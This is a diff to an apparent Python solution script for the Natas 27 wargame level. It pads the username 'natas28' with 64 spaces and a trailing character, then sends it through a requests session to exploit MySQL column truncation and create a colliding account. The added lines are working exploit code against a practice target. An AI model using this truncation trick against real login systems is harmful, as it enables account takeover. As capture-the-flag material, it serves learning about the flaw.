@@ -91,3 +91,15 @@ new_username = 'natas28' + ' ' * 64 + 'a'
 print(f'{new_username}\n')
 # we can skip the validUser() check because it will not trim the username and pass it as-is
 # therefore, comparing the new username above with natas28 will return False
+
+
+# since validUser() check will be skipped, it will create a new user
+# when inserting a new user, however, mysql will remove any character after the constraint
+# in this case, it will only take the first 64 characters
+params = {
+    "username" : new_username,
+    "password" : "randompassword"
+}
+response = session.get(URL, params=params)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
